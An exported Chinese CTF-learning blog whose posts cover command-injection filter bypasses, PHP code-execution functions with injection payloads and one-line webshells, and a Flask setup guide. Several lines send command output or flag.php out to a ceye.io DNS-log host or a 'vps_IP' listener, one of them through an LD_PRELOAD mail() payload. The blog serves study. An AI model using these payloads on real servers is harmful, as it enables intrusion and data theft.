{"meta":{"title":"chuddy's Blog","subtitle":"keep hungry keep foolish","description":null,"author":"chuddy","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"命令注入的绕过姿势","slug":"命令注入的绕过姿势","date":"2019-07-29T13:46:40.000Z","updated":"2019-08-21T07:45:49.287Z","comments":true,"path":"2019/07/29/命令注入的绕过姿势/","link":"","permalink":"http://yoursite.com/2019/07/29/命令注入的绕过姿势/","excerpt":"命令注入的绕过姿势前言命令注入是我们常见的漏洞，在CTF中也经常见到。这里学习一波命令注入的骚姿势。","text":"命令注入的绕过姿势前言命令注入是我们常见的漏洞，在CTF中也经常见到。这里学习一波命令注入的骚姿势。 命令注入中常用的符号说到命令注入，我们不得不提到命令注入中几个常用的符号。 &amp;&amp; 表示将任务置于后台执行 ➜ ~ whoami &amp; ls [1] 1782 root [1] + 1782 done whoami anaconda-ks.cfg install.log install.log.syslog |( 管道符号)| 表示管道，上一条命令的输出，作为下一条命令的参数 ➜ ~ ls | whoami root ➜ ~ whoami | ls anaconda-ks.cfg install.log install.log.syslog 执行的是|后面的命令。 &amp;&amp;语法格式如下： command1 &amp;&amp; command2 [&amp;&amp; command3 ...] 1 命令之间使用 &amp;&amp; 连接，实现逻辑与的功能。 2 只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才会被执行。 3 只要有一个命令返回假（命令返回值 $? == 1），后面的命令就不会被执行。 只有前面的命令是真，后面的命令才会被执行 ➜ ~ cat aaa &amp;&amp; ls cat: aaa: 没有那个文件或目录 ➜ ~ touch a.txt ➜ ~ echo &#39;abc&#39; &gt; a.txt ➜ ~ cat a.txt &amp;&amp; whoami abc root ||语法格式如下： command1 || command2 [|| command3 ...] 1 命令之间使用 || 连接，实现逻辑或的功能。 2 只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才会被执行。这和 c 语言中的逻辑或语法功能相同，即实现短路逻辑或操作。 3 只要有一个命令返回真（命令返回值 $? == 0），后面的命令就不会被执行。 该用法和&amp;&amp;正好相反，只有前面的命令是假的，后面的命令才会被执行。 ➜ ~ cat a.txt || whoami abc ➜ ~ cat a || whoami cat: a: 没有那个文件或目录 root ➜ ~ ；(分号)多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块 无论前面，命令是否为真，都会被执行 ➜ ~ cat a.txt;whoami abc root ➜ ~ cat a;whoami cat: a: 没有那个文件或目录 root 和$()在bash中，$( )与` `（反引号）都是用来作命令替换的。 各自的优缺点： 1. ` ` 基本上可用在全部的 unix shell 中使用，若写成 shell脚本，其移植性比较高，但反单引号容易打错或看错。 2. $()更有可读性，但是$()并不是所有shell都支持。 root@kali:~/chuddy# $(whoami) bash: root：未找到命令 root@kali:~/chuddy# $(cat a.txt) bash: abc：未找到命令 root@kali:~/chuddy# $(ls) bash: 1562578910726843：未找到命令 root@kali:~/chuddy# $(ls) bash: 1562578910726843：未找到命令 root@kali:~/chuddy# echo `ls` 1562578910726843 a.txt ctf rip-git.pl web root@kali:~/chuddy# `ls` bash: 1562578910726843：未找到命令 root@kali:~/chuddy# 尝试发现如果直接使用，发现能回返回第一行的结果以及bash: root：未找到命令,可以和echo一起使用。echo $(ls) ()和{}如果希望把几个命令合在一起执行，shell提供了两种方法。既可以在当前shell也可以在子shell中执行一组命令。 (command1;command2;command3....) { command1;command2;command3…} #第一条命令必须与左边的括号有一个空格，最后一条命令一定要有分号 相同点： ()和{}都是把一串的命令放在括号里面,并且命令之间用;号隔开 不同点 ()只是对一串命令重新开一个子shell进行执行,{}对一串命令在当前shell执行 ()最后一个命令可以不用分号,{}最后一个命令要用分号 ()里的第一个命令和左边括号不必有空格,{}的第一个命令和左括号之间必须要有一个空格 ()和{}中括号里面的某个命令的重定向只影响该命令,但括号外的重定向则影响到括号里的所有命令 root@kali:~/chuddy# (ls;whoami) 1562578910726843 a.txt ctf rip-git.pl web root root@kali:~/chuddy# {ls;whoami} bash: {ls：未找到命令 bash: whoami}：未找到命令 root@kali:~/chuddy# {ls;whoami;} bash: 未预期的符号“}”附近有语法错误 root@kali:~/chuddy# { ls;whoami;} 1562578910726843 a.txt ctf rip-git.pl web root root@kali:~/chuddy# { ls;whoami} &gt; ; bash: 未预期的符号“;”附近有语法错误 root@kali:~/chuddy# { ls;whoami;} 1562578910726843 a.txt ctf rip-git.pl web root root@kali:~/chuddy# 测试发现bash下对{}是又要求的，但是我使用zsh主题的情况下，是不受{}规则的影响的 ➜ ~ { ls;whoami} anaconda-ks.cfg a.txt install.log install.log.syslog root ➜ ~ { ls;whoami} anaconda-ks.cfg a.txt install.log install.log.syslog root ➜ ~ {ls;whoami} anaconda-ks.cfg a.txt install.log install.log.syslog root ➜ ~ {ls;whoami;} anaconda-ks.cfg a.txt install.log install.log.syslog root ➜ ~ Shell 输入/输出重定向大多数 UNIX 系统命令从你的终端接受输入并将所产生的输出发送回​​到您的终端。一个命令通常从一个叫标准输入的地方读取输入，默认情况下，这恰好是你的终端。同样，一个命令通常将其输出写入到标准输出，默认情况下，这也是你的终端。 使用比较多的命令： 命令说明： command &gt; file：将输出重定向到 file。 command &lt; file：将输入重定向到 file。 command &gt;&gt; file：将输出以追加的方式重定向到 file。 ➜ ~ echo &#39;abcd&#39; &lt; a.txt abcd ➜ ~ cat a.txt abc ➜ ~ echo &#39;123&#39; &gt;a.txt ➜ ~ cat a.txt 123 ➜ ~ echo &#39;abc&#39; &gt;&gt; a.txt ➜ ~ cat a.txt 123 abc ➜ ~ 直接用&gt; 会覆盖原文件的内容，用&gt;&gt;能够追加写入文件，不会覆盖原文件。 一些常见的限制通配符的使用可以绕过一些关键字的限制。 ?：匹配任何一个字符 存在文件flag.php,并且过滤了关键字flag的情况下进行文件读取 ➜ ~ cat f?a?.??? flag{abc_123_haha} ➜ ~ cat ???????? //会读取所有他匹配的文档 flag{abc_123_haha} ➜ ~ touch fake.txt ➜ ~ echo &#39;this_is_a_text&#39; &gt;fake.txt ➜ ~ cat ???????? this_is_a_text flag{abc_123_haha} ➜ ~ *：匹配任何字符串／文本，包括空字符串 ➜ ~ cat f* //会读取所有他匹配的文档 this_is_a_text flag{abc_123_haha} ➜ ~ cat fl* flag{abc_123_haha} ➜ ~ cat fla* flag{abc_123_haha} ➜ ~ []和{}的使用 [....]：匹配范围中任何一个字符[a-z]：匹配a-z范围中任何一个字符 {a,b}：对以逗号分割的文件列表进行拓展 ➜ ~ cat fl[abc]g.php flag{abc_123_haha} ➜ ~ cat fl[a-z]g.php flag{abc_123_haha} ➜ ~ cat fl[bc]g.php zsh: no matches found: fl[bc]g.php ➜ ~ cat fl{a,b,c}g.php flag{abc_123_haha} cat: flbg.php: 没有那个文件或目录 cat: flcg.php: 没有那个文件或目录 ➜ ~ cat fl{b,c}g.php cat: flbg.php: 没有那个文件或目录 cat: flcg.php: 没有那个文件或目录 ➜ ~ 它们的区别：{...}与[...]有一个很重要的区别。如果匹配的文件不存在，[...]会失去模式的功能，变成一个单纯的字符串，而{...}依然可以展开。 注意 在使用过程中应该注意： 上面所有通配符只匹配单层路径，不能跨目录匹配，即无法匹配子目录里面的文件。或者说，?或*这样的通配符，不能匹配路径分隔符（/）。 如果要匹配子目录里面的文件，可以写成下面这样。 ➜ ~ ls */*.txt admin/admin.txt ➜ ~ ls ?????/*.txt admin/admin.txt ➜ ~ ls ./?????/*.txt ./admin/admin.txt 可用于文件名。 Bash 允许文件名使用通配符。这时，引用文件名的时候，需要把文件名放在单引号里面。 ➜ ~touch a* ➜ ~ ls ➜ ~touch &#39;a*&#39; ➜ ~ ls a* 空格绕过使用&lt;或者&lt;&gt; ➜ ~ cat&lt;a.txt abc ➜ ~ cat&lt;&gt;a.txt #需要写的权限 abc ➜ ~ 使用IFS root@kali:~/chuddy# cat$IFSa.txt bash: cat.txt：未找到命令 root@kali:~/chuddy# cat$IFS$9a.txt abc root@kali:~/chuddy# cat${IFS}a.txt abc root@kali:~/chuddy# cat$IFS./a.txt abc oot@kali:~/chuddy# cat$IFS\\./a.txt abc 在url的编码绕过 %20(space) + %09(tab) %3c(&lt;) 花括号拓展{OS_COMMAND,ARGUMENT} 在Linux bash中还可以使用{cat,/etc/passwd}来绕过，如果使用zsh主题就不能执行。 root@kali:~/chuddy# {cat,a.txt} abc 变量控制 root@kali:~/chuddy# X=$&#39;cat\\x09./a.txt&#39;&amp;&amp;$X abc root@kali:~/chuddy# X=$&#39;cat\\x20./a.txt&#39;&amp;&amp;$X abc 命令分隔与执行多条命令在Unix上: %0a //没成功 %0d //没成功 ; &amp; | || &amp;&amp; $(shell_command) `shell_command` { shell_command;} 在Windows上： %0a &amp; | %1a - 一个神奇的角色，作为.bat文件中的命令分隔符 关键字过滤绕过空变量 使用$*和$@，$x(x代表1-9),${x}(x&gt;=10)(我尝试小于10也是可以的)PS：因为在没有传参的情况下，上面的特殊变量都是为空的 root@kali:~/chuddy# c$*at a.txt abc root@kali:~/chuddy# ca$@t a.txt abc root@kali:~/chuddy# ca$2t a.txt abc root@kali:~/chuddy# ca$10t a.txt bash: ca0t：未找到命令 root@kali:~/chuddy# ca${10}t a.txt abc root@kali:~/chuddy# ca${7}t a.txt abc 反斜杠 root@kali:~/chuddy# ca\\t a.txt abc 变量替换 root@kali:~/chuddy# a=ca;b=t;c=a.txt;$a$b $c abc root@kali:~/chuddy# a=&quot;abctx. &quot;;b=${a:2:1}${a:0:1}${a:3:1}${a:6:1}${a:0:1}${a:5:1}${a:3:1}${a:4:1}${a:3:1};$b //b=cat a.txt abc 引号 root@kali:~/chuddy# c&#39;a&#39;t a.txt abc root@kali:~/chuddy# c&quot;a&quot;t a.txt abc 编码绕过 base64编码： root@kali:~/chuddy# echo &#39;cat a.txt&#39;| base64 Y2F0IGEudHh0Cg== root@kali:~/chuddy# `echo &#39;Y2F0IGEudHh0Cg==&#39; | base64 -d` abc 十六进制： root@kali:~/chuddy# echo &#39;cat a.txt&#39; | xxd -p 63617420612e7478740a root@kali:~/chuddy# `echo &#39;0x63617420612e7478740a&#39;| xxd -r -p` abc root@kali:~/chuddy# root@kali:~/chuddy# $(printf &quot;\\x63\\x61\\x74\\x20\\x61\\x2e\\x74\\x78\\x74\\x0a&quot;) abc 利用已有资源与字符 root@kali:~/chuddy# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin root@kali:~/chuddy# echo $PATH|cut -c 8 c root@kali:~/chuddy# echo $PATH|cut -c 9 a root@kali:~/chuddy# `echo $PATH|cut -c 8`at a.txt abc root@kali:~/chuddy# c`echo $PATH|cut -c 9`t a.txt abc","categories":[],"tags":[]},{"title":"命令注入","slug":"命令注入","date":"2019-07-29T09:36:38.000Z","updated":"2019-08-21T07:46:00.335Z","comments":true,"path":"2019/07/29/命令注入/","link":"","permalink":"http://yoursite.com/2019/07/29/命令注入/","excerpt":"命令注入简介命令注入(也称为shell注入)是一种web安全漏洞，它允许攻击者在运行应用程序的服务器上执行任意操作系统(OS)命令，通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用OS命令注入漏洞来破坏宿主基础设施的其他部分，利用信任关系将攻击转移到组织内的其他系统。","text":"命令注入简介命令注入(也称为shell注入)是一种web安全漏洞，它允许攻击者在运行应用程序的服务器上执行任意操作系统(OS)命令，通常会完全破坏应用程序及其所有数据。通常，攻击者可以利用OS命令注入漏洞来破坏宿主基础设施的其他部分，利用信任关系将攻击转移到组织内的其他系统。 在Web应用中，有时候会用到一些命令执行的函数，如php中system、exec、shell_exec等，当对用户输入的命令没有进行限制或者过滤不严导致用户可以执行任意命令时，就会造成命令执行漏洞。 常见命令执行函数 system() passthru() exec() pcntl_exec() shell_exec() popen() proc_open() `反引号 ob_start() mail函数+LD_PRELOAD执行系统命令 system()函数定义： string system ( string $command [, int &amp;$return_var ] ) command是要执行的命令。return_var，如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。 &lt;?php system(&quot;whoami&quot;); ?&gt; 会看到运行了shell命令，并打印回显到页面上。 passthru()函数定义： void passthru ( string $command [, int &amp;$return_var ] ) command是要执行的命令。return_var，如果提供 return_var 参数， Unix 命令的返回状态会被记录到此参数。 &lt;?php passthru(&quot;whoami&quot;); ?&gt; exec()函数定义： string exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) exec() 执行 command 参数所指定的命令。 &lt;?php echo exec(&quot;whoami&quot;); ?&gt; 该函数不能直接回显，需要手动输出。。。 可以利用ceye： data=$(cat flag.php | base64);curl http://36rdia.ceye.io/？data=$data; pcntl_exec()函数定义：pcntl_exec — 在当前进程空间执行指定程序 void pcntl_exec ( string $path [, array $args [, array $envs ]] ) path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 args是一个要传递给程序的参数的字符串数组。 envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。 ➜ html php -r &quot;pcntl_exec( &#39;/bin/ls&#39; , array(&#39;./&#39;));&quot; 输出的结果： 1.txt 2.txt web 让我们来看看/bin下又什么文件： 发现我们可以通过这个函数来执行cat，echo，chmod, rm , touch等命令 例如： ➜ html php -r &quot;pcntl_exec( &#39;/bin/echo&#39; , array(&#39;`ls`&#39;));&quot; 1.txt 2.txt web shell_exec()函数定义： string shell_exec ( string $cmd ) cmd是要执行的命令。 ➜ html php -r &quot;echo shell_exec(&#39;whoami&#39;);&quot; root ➜ html popen()函数定义： resource popen ( string $command , string $mode ) 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 后面的mode，当为 ‘r’，返回的文件指针等于命令的 STDOUT，当为 ‘w’，返回的文件指针等于命令的 STDIN。 ➜ html php -r &quot;popen(&#39;/bin/echo \\&quot;123\\&quot; &gt;&gt; 1.txt&#39;,&#39;w&#39;);&quot; ➜ html cat 1.txt 123 能够执行的命令 proc_open()函数定义： resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] ) cmd是要执行的命令，其余见文档 `反引号在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。 ➜ html php -r &quot;echo @`whoami`;&quot; root# ob_start()官方文档 ob_start($a)参数a是一个回调函数名，当缓存刷新时，把缓冲区的内容作为一个参数传给回调函数处理，回调函数内不能再调用ob_start(). 测试： &lt;?php $foobar = &#39;system&#39;; ob_start($foobar); echo &#39;whoami&#39;; ob_end_flush(); ?&gt; 可以成功执行whoami的命令。但是php7测试未成功这里注意，如果我这样使用 echo ‘whoami’; whoami 是没有任何作用的 因为这里的$foobar被作为输出的回调函数 而我们输入的whoami在缓冲区 经过ob_end_flush()输出缓冲区后，可以得到 system(&#39;whoami&#39;) 这样的操作，所以成功执行了命令 mail函数+LD_PRELOAD执行系统命令思路：LD_PRELOAD可以用来设置程序运行前优先加载的动态链接库，php函数mail在实现的过程中会调用标准库函数，通过上传一个编译好的动态链接程序(这个程序中重新定义了一个mail函数会调用的库函数，并且重新定义的库函数中包含执行系统命令的代码。)，再通过LD_PRELOAD来设置优先加载我们的上传的动态链接程序，从而实现命令执行。 a.c #include &lt;stdlib.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; int main(){ void payload() { system(&quot;curl http://vps_IP:4123/?a=`whoami`&quot;); } int geteuid() { if (getenv(&quot;LD_PRELOAD&quot;) == NULL) { return 0; } unsetenv(&quot;LD_PRELOAD&quot;); payload(); } } 编译 gcc -c -fPIC a.c -o a gcc -shared a -o a.so mail.php &lt;?php putenv(&quot;LD_PRELOAD=/var/www/html/a.so&quot;); mail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;); ?&gt; 监听vps的4123端口，访问mail.php。","categories":[],"tags":[{"name":"web常见漏洞","slug":"web常见漏洞","permalink":"http://yoursite.com/tags/web常见漏洞/"}]},{"title":"php代码注入","slug":"php代码注入","date":"2019-07-26T12:34:12.000Z","updated":"2019-08-21T07:45:50.402Z","comments":true,"path":"2019/07/26/php代码注入/","link":"","permalink":"http://yoursite.com/2019/07/26/php代码注入/","excerpt":"代码注入简介代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做PHP代码执行。","text":"代码注入简介代码注入攻击通常是指：用户输入未作严格过滤，导致提交的内容传入某些函数会被当做PHP代码执行。 常见php命令注入函数eval()，assert(), system()，preg_replace(),create_function, call_user_func,call_user_func_array，array_map()，反引号，ob_start()，exec()，shell_exec()，passthru()，escapeshellcmd()，popen()，proc_open()，pcntl_exec() eval这个函数我们在制作小马的时候经常用到：&lt;?php eval($_POST[&#39;aaa&#39;]); ?&gt; 在php官方手册上就表明了它是很危险的函数，允许执行任意的php代码。 # 1. 没有任何过滤 &lt;?php @eval($_GET[&quot;aa&quot;]); ?&gt; ?aa=phpinfo(); # 2. addslashes 过滤 &lt;?php $aa= @(string)$_GET[&quot;aa&quot;]; eval(&#39;$aa=&quot;&#39; . addslashes($aa) . &#39;&quot;;&#39;); ?&gt; # ${${} } 绕过 aa=${${phpinfo()} } # 3 双引号包含过滤 &lt;?php $aa= &quot;echo \\&quot;hello &quot; . $_GET[&#39;aa&#39;] . &quot;\\&quot;;&quot;; eval($aa); # ${${} } 绕过 aa=${${phpinfo()} } aa=${@system(&#39;dir&#39;)} ${${} } 绕过是利用可变变量的二次嵌套，执行里面花括号内的代码，如: echo &quot;${${phpinfo()}}&quot;;, 会执行phpinfo(), 这里必须是双引号包含，双引号包含时会解析包含的字符串中的变量。 PHP可变变量可以无需二次嵌套，一次也可以执行，echo &quot;${phpinfo()}&quot;;这种情况是不能执行的，而echo &quot;${/**/phpinfo()}&quot;;是能执行phpinfo()的, 这是因为花括号解析语法的关键条件是花括号内的第一个字符，空格，tab，注释，回车是各种语法分析引擎中常见的分割字符，@是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号, 因此下面代码都能执行。 php &gt;= 4.3 &quot;${ phpinfo()}&quot;; &quot;${ phpinfo()}&quot;; &quot;${/**/phpinfo()}&quot;; &quot;${ phpinfo()}&quot;; &quot;${@phpinfo()}&quot;; &quot;${( string )phpinfo()}&quot;; &quot;${phpinfo[phpinfo()]}&quot;; &quot;{$phpinfo[phpinfo()]}&quot;; &quot;{${phpinfo()}}&quot;; &quot;${${phpinfo()}}&quot;; php&gt;=5.5 &quot;${phpinfo()}&quot;; 可以执行phpinfo()函数（使用${}可以执行php函数）。。。 ${}${php代码} ${phpinfo()}; 即可执行phpinfo(); assert&lt;?php @assert($_GET[&quot;aa&quot;]); ?&gt; aa=phpinfo(); system&lt;?php system(&quot;ping -c 2 &quot;.$_GET[&#39;ip&#39;]); ?&gt; 正常访问：ip=127.0.0.1 是一个常规的ping命令 我们进行命令注入 ip=127.0.0.1|dir 就可以得到回显了 如果我们把代码放在linux上面，就可能得不到回显，在没有回显的情况下我们应该怎样得到我们想要的信息呢？这种时候就需要利用dnslog来查看命令执行的结果。 这里介绍一个dnslog利用平台，ceye。 在注册ceye.io之后会分配一个三级域名。就是******.ceye.io。 ping `whoami`.******.ceye.io 上面这条命令最终在ping的时候ping的是apache.******.ceye.io，apache就是我们构造的恶意命令whoami执行的结果，我们把它放在四级域名这里，这样在DNS解析的时候就会记录下root这个四级域名。然后可以在ceye平台上看到我们的dns解析日志。也就看到了命令执行的回显。 尝试ip=`pwd`.36rdia.ceye.io在页面中无回显，在ceye中的我们可以看到回显： 在治理我们看到了绝对路径：/var/www/html preg_replace()我们查看一下php手册对它的介绍 preg_replace()函数可以引发代码执行，源于PCRE (Perl Compatible Regular Expressions)中的e(PREG_REPLACE_EVAL)选项， /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 例如：preg_replace(&quot;/test/e&quot;,phpinfo(),&quot;jutst test&quot;);这样就能调用phpinfo()。 注意 php7.0.0 不再支持 /e修饰符。 请用 preg_replace_callback() 代替。 php5.5.0 /e 修饰符已经被弃用了。使用 preg_replace_callback() 代替 在实践的时候需要看清php版本,在7.0的版本以后就不再适用！ 举个例子 代码： &lt;?php function complexStrtolower($regex,$value){ return preg_replace(&#39;/(&#39;.$regex.&#39;)/ei&#39;, &#39;strtolower(&quot;\\\\1&quot;)&#39;,$value); } foreach ($_GET as $regex =&gt; $value) { echo $value.&quot;\\n&quot;; echo complexStrtolower($regex,$value).&quot;\\n&quot;; } ?&gt; 这里使用了/e模式，输入的参数和对应的参数值分别对应于匹配的模式和用于正则匹配的字符串，这两个参数都可以通过GET方式进行控制，但是第二个参数写定了 strtolower(&quot;\\\\1&quot;) 正则表达式 分组 在这里我把表达式统一以\\w为例： (\\w)(\\w) 自动命名分组，第一个小括号是分组1，第二个小括号是分组2 正则表达式 反向引用 后面的表达式可以引用前面的某个分组，用\\1表示，就好像分组1的值赋值给了\\1这个变量，这个变量可以在后面任意位置引用。 \\1 表示分组1匹配的文本 \\\\1实际上就是\\1，即第一个匹配项只需要控制匹配模式为/(.*)/，匹配出来的字符串为我们想要执行的代码，就可以了。 注意 preg_replace/e只执行一次代码，即strtolower函数，所以我们必须想办法让输入的phpinfo()自己执行，这就涉及到了php动态变量，payload为{${phpinfo()}}，我们知道php变量名经过{}包裹后会将变量值输出,而这里phpinfo被{}包裹后会首先执行phpinfo() 我们测试一下， &lt;?php preg_replace(&#39;/(.*)/ie&#39;,&#39;strtolower(&quot;\\\\1&quot;)&#39;,&#39;{${phpinfo()}}&#39;); ?&gt; 发现能够成功执行代码。所以payload=.*={${phpinfo()}} 但是没有成功执行phpinfo()代码，这是因为php的一个特性：php自身在解析请求时，如果参数中包含.这个字符，会将他转换为下划线。所以我们传递参数被解析为_*={${phpinfo()}}我们换个通用字符即可，因此payload:\\S*={${phpinfo()}} 也可以执行命令： create_function()查阅php手册 string create_function ( string $args , string $code ) 函数作用：从创建一个匿名函数传递的参数，并返回一个唯一的名称 看一个官方样例 &lt;?php $newfunc = create_function(&#39;$a,$b&#39;, &#39;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#39;); echo &quot;New anonymous function: $newfunc\\n&quot;; echo $newfunc(2, M_E) . &quot;\\n&quot;; ?&gt; 我们不难得到create_function()的原型 function test($a,$b) { return &quot;ln($a) + ln($b) = &quot; . log($a * $b); } 他们的作用都是一样的。 小实例 代码： &lt;?php error_reporting(0); $sort_by = $_GET[&#39;sort_by&#39;]; $sorter = &#39;strnatcasecmp&#39;; $databases=array(&#39;1234&#39;,&#39;4321&#39;); $sort_function = &#39; return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]);&#39;; usort($databases, create_function(&#39;$a, $b&#39;, $sort_function)); ?&gt; 我们发现了匿名函数的存在，我们可以得到匿名函数的原型： function test($a,$b){ return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]); } 我们发现代码中$sort_by参数的值直接用GET取值未做过滤，create_function()中的函数体部分$sort_function只是简单的字符串拼接 我们尝试传递?sort_by=&quot;]);}phpinfo();/*我们发现能够成功执行phpinfo()传入后，此刻的函数原型为： function test($a,$b){ return 1 * strnatcasecmp($a[&quot;&quot;]);}phpinfo();/*&quot;], $b[&quot;&quot;]);}phpinfo();/*&quot;]); } 很显然，经过/*注释符我们剩下的只有 function test($a,$b){ return 1 * strnatcasecmp($a[&quot;&quot;]); } phpinfo(); 就能够执行php函数。 call_user_func()/call_user_func_array()call_user_func()是一个回调函数，用法参照php手册： 用法： &lt;?php $a = &#39;assert&#39;; $b = &#39;phpinfo()&#39;; call_user_func($a,$b); ?&gt; 可以执行phpinfo() call_user_func_array()也是一个回调函数，用法参照php手册： 用法： &lt;?php $a = &#39;assert&#39;; $b[0] = &#39;phpinfo()&#39;; call_user_func_array($a,$b); ?&gt; 可以执行phpinfo() 两者本质都差不多，但是call_user_func_array()必须带参数。 array_map()array_map()是一个回调函数，用法参照php手册： array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给array_map() 函数的数组数目一致 测试： &lt;?php array_map(&#39;system&#39;,$_GET[&#39;cmd&#39;]); ?&gt; payload=?cmd[0]=whoami&amp;cmd[1]=dir发现两条命令都执行了： array_filter()官方文档: 测试 ?cmd[]=whoami &lt;?php array_filter($_GET[&#39;cmd&#39;],&#39;system&#39;); ?&gt; usort()/uasort()usort() 官方文档: 测试： &lt;?php // ?1[]=test&amp;1[]=phpinfo();&amp;2=assert usort(...$_GET); ?&gt; 关于...$_GET是php5.6引入的新特性。即将数组展开成参数的形式。 GET变量被展开成两个参数[&#39;test&#39;, &#39;phpinfo();&#39;]和assert，传入usort函数。usort函数的第二个参数是一个回调函数assert，其调用了第一个参数中的phpinfo();。 只有在php5.6以上环境才可使用 uasort() 官方文档: 测试： &lt;?php // ?1=2;&amp;2=phpinfo(); usort($_GET,&#39;asse&#39;.&#39;rt&#39;); ?&gt; ob_start()官方文档 ob_start($a)参数a是一个回调函数名，当缓存刷新时，把缓冲区的内容作为一个参数传给回调函数处理，回调函数内不能再调用ob_start(). 测试： &lt;?php $foobar = &#39;system&#39;; ob_start($foobar); echo &#39;whoami&#39;; ob_end_flush(); ?&gt; 可以成功执行whoami的命令。但是php7测试未成功这里注意，如果我这样使用 echo ‘whoami’; whoami 是没有任何作用的 因为这里的$foobar被作为输出的回调函数 而我们输入的whoami在缓冲区 经过ob_end_flush()输出缓冲区后，可以得到 system(&#39;whoami&#39;) 这样的操作，所以成功执行了命令 register_shutdown_function()官方文档： register_shutdown_function($a)参数a是一个函数名，也可以给他传参,可以传多个register_shutdown_function($a,$b) 实例： //?cmd=whoami &lt;?php register_shutdown_function(&#39;system&#39;,$_GET[&#39;cmd&#39;]); ?&gt; //?cmd=phpinfo &lt;?php register_shutdown_function($_GET[&#39;cmd&#39;]); ?&gt; array_walk(),array_walk_recursive()官方文档： array_walk($a,$b)array_walk_recursive($a,$b)他们的参数a是个数组，参数b是个回调函数的名字，这两个函数都是把数组中的值作为参数带到回调函数中执行。第二个可以遍历多维数组。 测试： //?cmd[]=whoami 两个都可以执行 //?cmd[0][]=whoami 第二个可以执行，第一个不能执行。 &lt;?php array_walk($_GET[&#39;cmd&#39;],&#39;system&#39;); echo &quot;&lt;br&gt;&quot;; array_walk_recursive($_GET[&#39;cmd&#39;],&#39;system&#39;); ?&gt; 危险函数合集直接执行代码 eval() ${} assert() preg_replace()(php7不支持.5.5以后废弃改成preg_replace _callback(） 可以控制函数内容 create_function() 能控制函数参数和函数名 较容易 call_user_func（），call_user_func_array（） ob_start() php7测试未成功 array_map()，array_walk(),array_walk_recursive() register_shutdown_function() preg_replace _callback() array_filter() array_reduce() 比较困难，参数可控但是有限制 xml_set_character_data_handler() xml_set_default_handler() xml_set_element_handler() xml_set_end_namespace_decl_handler() xml_set_external_entity_ref_handler() xml_set_notation_decl_handler() xml_set_processing_instruction_handler() xml_set_start_namespace_decl_handler() xml_set_unparsed_entity_decl_handler() stream_filter_register() set_error_handler() usort(),uasort(), uksort(),array_diff_uassoc(), array_diff_ukey() array_udiff(), array_udiff_assoc(), array_udiff_uassoc() array_intersect_assoc(), array_intersect_uassoc() array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc() register_tick_function()","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"Python框架Flask基础学习","slug":"Python框架Flask基础学习","date":"2019-07-24T06:26:30.000Z","updated":"2019-08-21T07:46:27.422Z","comments":true,"path":"2019/07/24/Python框架Flask基础学习/","link":"","permalink":"http://yoursite.com/2019/07/24/Python框架Flask基础学习/","excerpt":"Python框架Flask基础学习简介Flask是由python实现的一个web微框架，让我们可以使用Python语言快速实现一个网站或Web服务。而且有对应的python3及python2版本。","text":"Python框架Flask基础学习简介Flask是由python实现的一个web微框架，让我们可以使用Python语言快速实现一个网站或Web服务。而且有对应的python3及python2版本。 环境 windows10系统 python2.7（之所以是2.7而不是3.x，因为大多数库只支持2.x） 已安装pip（Python包管理工具） 安装 建立：找一个目录建立flask文件夹 安装virtualenv，再此目录打开命令行窗口输入： pip install virtualenv 新建一个目录，并在里边创建virtualenv环境，在DOS下 mkdir demo cd demo virtualenv venv 这时你创建的myproject文件夹里面就多了一个venv文件夹 激活虚拟环境 venv\\scripts\\activate.bat 5.在virtualenv里面安装Flask pip install Flask 至此flask环境已经搭好了。 目录结构通过别人的目录大致了解flask框架的目录结构 flask-demo/ ├ run.py # 应用启动程序 ├ config.py # 环境配置 ├ requirements.txt # 列出应用程序依赖的所有Python包 ├ tests/ # 测试代码包 │ ├ __init__.py │ └ test_*.py # 测试用例 └ myapp/ ├ admin/ # 蓝图目录 ├ static/ │ ├ css/ # css文件目录 │ ├ img/ # 图片文件目录 │ └ js/ # js文件目录 ├ templates/ # 模板文件目录 ├ __init__.py ├ forms.py # 存放所有表单，如果多，将其变为一个包 ├ models.py # 存放所有数据模型，如果多，将其变为一个包 └ views.py # 存放所有视图函数，如果多，将其变为一个包 Hello worldfrom flask import Flask app = Flask(__name__) @app.route(&#39;/&#39;) def hello(): return &quot;Hello World&quot; if __name__ ==&#39;__main__&#39;: app.debug = True app.run() 使用python运行后访问localhost:5000就能看到网页显示Hello 